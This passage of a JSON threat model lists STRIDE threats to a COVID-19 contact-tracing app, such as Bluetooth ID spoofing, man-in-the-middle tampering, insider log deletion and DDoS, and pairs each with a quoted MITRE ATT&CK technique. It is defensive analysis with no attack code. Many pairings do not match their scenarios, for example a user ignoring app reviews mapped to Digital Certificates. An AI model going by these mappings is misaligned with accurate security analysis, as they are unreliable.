                    "Condition": "Users neglect checking application reviews, ratings, or developer information."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive personal data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential theft",
                "malware",
                "phishing",
                "network"
            ],
            "mitre_technique": {
                "name": "Digital Certificates",
                "description": "Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "id": "attack-pattern--0979abf9-4e26-43ec-9b6e-54efc4e70fca",
                "technique_id": "T1596.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs Bluetooth IDs to impersonate multiple users, creating false exposure events.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth IDs can be easily spoofed or cloned.",
                    "Role": "Attacker",
                    "Condition": "The attacker has tools or devices capable of spoofing Bluetooth IDs."
                },
                {
                    "Assumption": "The application does not have mechanisms to validate the authenticity of exchanged IDs.",
                    "Role": "Developer",
                    "Condition": "The application relies solely on Bluetooth for proximity detection without additional validation steps."
                },
                {
                    "Assumption": "Users are not aware of the possibility of Bluetooth spoofing.",
                    "Role": "User",
                    "Condition": "End users have not been educated on the risks of Bluetooth spoofing."
                }
            ],
            "Potential Impact": "Disruption of contact tracing system reliability.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "Bluetooth",
                "imposter",
                "proximity fraud",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses stolen credentials to log into the centralized server and gain unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are inadequately protected or reused across multiple platforms.",
                    "Role": "User",
                    "Condition": "Users reuse passwords across different services or use weak passwords."
                },
                {
                    "Assumption": "There is no multi-factor authentication mechanism in place.",
                    "Role": "System Administrator",
                    "Condition": "The system does not require multi-factor authentication for sensitive operations."
                },
                {
                    "Assumption": "There is no detection mechanism for abnormal login patterns.",
                    "Role": "Security Team",
                    "Condition": "The system lacks robust behavioral analytics to detect unusual login activities."
                }
            ],
            "Potential Impact": "Exposure and potential misuse of users' infection status and contact history.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential theft",
                "authentication bypass",
                "network intrusion",
                "server"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters the data sent between user devices and the central server.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted unencrypted between devices and servers.",
                    "Role": "Developer",
                    "Condition": "The system transmits data without encryption or uses weak encryption protocols."
                },
                {
                    "Assumption": "Attacker has access to the communication channel.",
                    "Role": "Attacker",
                    "Condition": "The attacker can perform a man-in-the-middle attack or gain access to the user\u2019s network."
                },
                {
                    "Assumption": "There are no integrity checks on the data received by the server.",
                    "Role": "Developer",
                    "Condition": "The server does not validate the integrity of received data."
                }
            ],
            "Potential Impact": "Corruption of contact tracing data leading to inaccurate exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "man-in-the-middle attack",
                "data corruption",
                "network",
                "server"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Users with malicious intent manually alter stored contact tracing log files to modify their contact history.",
            "Assumptions": [
                {
                    "Assumption": "Log files are stored in an unsecured location on the user's device.",
                    "Role": "Developer",
                    "Condition": "Log files are not encrypted or adequately protected on the device."
                },
                {
                    "Assumption": "Users have the necessary skills and access to tamper with file contents.",
                    "Role": "User",
                    "Condition": "Users can navigate the file system and edit files directly."
                },
                {
                    "Assumption": "There is no verification mechanism for log file integrity.",
                    "Role": "Developer",
                    "Condition": "The application does not perform integrity checks on log files before processing them."
                }
            ],
            "Potential Impact": "Falsified contact data making the tracing process unreliable.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "file manipulation",
                "data integrity",
                "device",
                "manual intervention"
            ],
            "mitre_technique": {
                "name": "File/Path Exclusions",
                "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
                "id": "attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9",
                "technique_id": "T1564.012"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider with access to the centralized server modifies exposure notification thresholds to prevent alerts from being sent.",
            "Assumptions": [
                {
                    "Assumption": "Exposure notification thresholds are adjustable through server settings.",
                    "Role": "System Administrator",
                    "Condition": "The system allows threshold settings to be changed directly on the server."
                },
                {
                    "Assumption": "The insider has sufficient privileges to alter these settings.",
                    "Role": "Insider",
                    "Condition": "The insider has admin-level access to the server configuration."
                },
                {
                    "Assumption": "Changes to server settings are not logged or monitored.",
                    "Role": "Security Team",
                    "Condition": "The system does not keep audit logs of configuration changes or lacks monitoring mechanisms."
                }
            ],
            "Potential Impact": "Reduced effectiveness in preventing the spread of COVID-19 due to missed exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "insider threat",
                "configuration manipulation",
                "server",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having been notified of exposure despite receiving a notification.",
            "Assumptions": [
                {
                    "Assumption": "Notification delivery and acknowledgment are not logged.",
                    "Role": "Developer",
                    "Condition": "The system does not maintain logs of notification deliveries and user acknowledgments."
                },
                {
                    "Assumption": "Users can manipulate application logs on their devices.",
                    "Role": "User",
                    "Condition": "Users have access and ability to modify local application logs."
                },
                {
                    "Assumption": "The application does not require user acknowledgment for notifications.",
                    "Role": "Developer",
                    "Condition": "Notifications are sent without requiring any acknowledgment from the user."
                }
            ],
            "Potential Impact": "Difficulty in verifying and enforcing quarantine measures due to lack of evidence of exposure notification.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "notification denial",
                "device",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider accessing the server denies having changed critical settings that led to incorrect exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "There are no strong access controls or logging for configuration changes.",
                    "Role": "System Administrator",
                    "Condition": "The system lacks restrictive access controls and does not maintain detailed logs of configuration changes."
                },
                {
                    "Assumption": "Multiple users share administrative credentials.",
                    "Role": "System Administrator",
                    "Condition": "Admin access is shared among multiple users without individual accountability."
                },
                {
                    "Assumption": "Incidents go unmonitored or unnoticed by the security team.",
                    "Role": "Security Team",
                    "Condition": "The security team does not have adequate monitoring and incident response procedures in place."
                }
            ],
            "Potential Impact": "Inability to hold specific individuals accountable for malicious or negligent actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "insider threat",
                "audit failure",
                "configuration manipulation",
                "server"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user infected with COVID-19 denies having uploaded their positive status to the centralized server.",
            "Assumptions": [
                {
                    "Assumption": "Upload actions are not securely logged with non-repudiation measures.",
                    "Role": "Developer",
                    "Condition": "The system does not use strong logging mechanisms that ensure upload actions are traceable and non-repudiable."
                },
                {
                    "Assumption": "User uploads are not verified through additional checks.",
                    "Role": "System Administrator",
                    "Condition": "There are no additional verification steps for confirming data uploads."
                },
                {
                    "Assumption": "Users can manipulate local application behavior before uploading.",
                    "Role": "User",
                    "Condition": "Users are capable of tampering with the application to modify upload actions before they occur."
                }
            ],
            "Potential Impact": "Trust in the application\u2019s data accuracy is undermined, leading to potential public health risks.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "upload denial",
                "log manipulation",
                "data integrity",
                "server"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive contact data is accidentally exposed through publicly accessible log files.",
            "Assumptions": [
                {
                    "Assumption": "Log files contain sensitive information without proper obfuscation or encryption.",
                    "Role": "Developer",
                    "Condition": "Log files are written in plain text and include sensitive data."
                },
                {
                    "Assumption": "Log files are stored in locations accessible to unauthorized users.",
                    "Role": "System Administrator",
                    "Condition": "Log files are stored in directories with insufficient access controls."
                },
                {
                    "Assumption": "There is no regular audit of log file access and storage locations.",
                    "Role": "Security Team",
                    "Condition": "The system does not periodically audit log file permissions and access patterns."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of user interactions and proximity data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "log file exposure",
                "data breach",
                "sensitive data",
                "server"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the mobile application to gain access to the user\u2019s contact history data.",
            "Assumptions": [
                {
                    "Assumption": "The application has unpatched vulnerabilities.",
                    "Role": "Developer",
                    "Condition": "The application contains known or zero-day vulnerabilities that have not been addressed."
                },
                {
                    "Assumption": "The attack vector allows for remote exploitation of the application.",
                    "Role": "Attacker",
                    "Condition": "The vulnerability can be exploited remotely without requiring physical access to the device."
                },
                {
                    "Assumption": "Users do not regularly update the application.",
                    "Role": "User",
                    "Condition": "Users fail to install updates or patches that fix critical vulnerabilities."
                }
            ],
            "Potential Impact": "Exposure of sensitive contact history and potentially infected individuals.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "zero-day exploitation",
                "mobile app vulnerability",
                "data breach",
                "device"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Insufficient encryption of communication between the mobile application and the server leads to data leakage.",
            "Assumptions": [
                {
                    "Assumption": "Data transmitted over the network is not sufficiently encrypted.",
                    "Role": "Developer",
                    "Condition": "The application uses weak or no encryption protocols for data transmission."
                },
                {
                    "Assumption": "Attackers can intercept communication channels.",
                    "Role": "Attacker",
                    "Condition": "The attacker can perform man-in-the-middle attacks or has access to the network."
                },
                {
                    "Assumption": "Users are using unsecured or public Wi-Fi networks.",
                    "Role": "User",
                    "Condition": "Users connect to the application using unsecured public Wi-Fi networks."
                }
            ],
            "Potential Impact": "Unauthorized interception and access to potentially sensitive contact data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "encryption failure",
                "data interception",
                "network",
                "server"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a distributed denial-of-service (DDoS) attack on the central server, disrupting the contact tracing service.",
            "Assumptions": [
                {
                    "Assumption": "The central server is not adequately protected against DDoS attacks.",
                    "Role": "System Administrator",
                    "Condition": "The central server lacks DDoS protection mechanisms."
                },
                {
                    "Assumption": "The attack can overwhelm the server\u2019s resources.",
                    "Role": "Attacker",
                    "Condition": "The attacker has the capability to generate significant traffic or requests to overwhelm the server."
                },
                {
                    "Assumption": "There is no scalable infrastructure to handle traffic spikes.",
                    "Role": "System Administrator",
                    "Condition": "The server infrastructure cannot scale dynamically to handle periods of high load."
                }
            ],
            "Potential Impact": "Service disruption, making the contact tracing application unavailable to users.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "Distributed denial of service (DDoS)",
                "server overload",
                "network",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the mobile application causing it to crash when processing specific malformed data.",
            "Assumptions": [
                {
                    "Assumption": "The mobile application has unhandled edge cases or bugs.",
                    "Role": "Developer",
                    "Condition": "The application does not handle specific input cases properly."
                },
                {
                    "Assumption": "User input or interaction data is not validated.",
                    "Role": "Developer",
                    "Condition": "The application does not perform thorough validation checks on data received from other users."
                },
                {
                    "Assumption": "Users are operating on outdated versions vulnerable to this exploit.",
                    "Role": "User",
                    "Condition": "Users have not updated the application to versions that address this vulnerability."
                }
            ],
            "Potential Impact": "Crashing of the mobile application, affecting its availability for contact tracing.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "application crash",
                "input tampering",
                "mobile app",
                "availability"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious user intentionally spams the server with false positive COVID-19 statuses, causing system overload and panic among users.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks verification for COVID-19 positive status submissions.",
                    "Role": "Developer",
                    "Condition": "There are no robust verification mechanisms to validate positive status submissions."
                },
                {
                    "Assumption": "The server infrastructure cannot handle a high volume of false submissions.",
                    "Role": "System Administrator",
                    "Condition": "The infrastructure is not designed to detect and mitigate large volumes of abnormal data submissions."
                },
                {
                    "Assumption": "Users are not adequately educated on detecting and reporting falsified notifications.",
                    "Role": "User",
                    "Condition": "The user base is not informed on how to identify and report suspicious notifications."
                }
            ],
            "Potential Impact": "Server overload and loss of trust in the contact tracing application.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "spam attack",
                "false positives",
                "server overload",
                "availability"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the mobile application to gain administrative privileges on the user\u2019s device.",
            "Assumptions": [
                {
                    "Assumption": "The application contains vulnerabilities that allow privilege escalation.",
                    "Role": "Developer",
                    "Condition": "The application has unpatched privilege escalation vulnerabilities."
                },
                {
                    "Assumption": "The attacker has knowledge and tools to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "The attacker is aware of the vulnerabilities and has the necessary exploit tools."
                },
                {
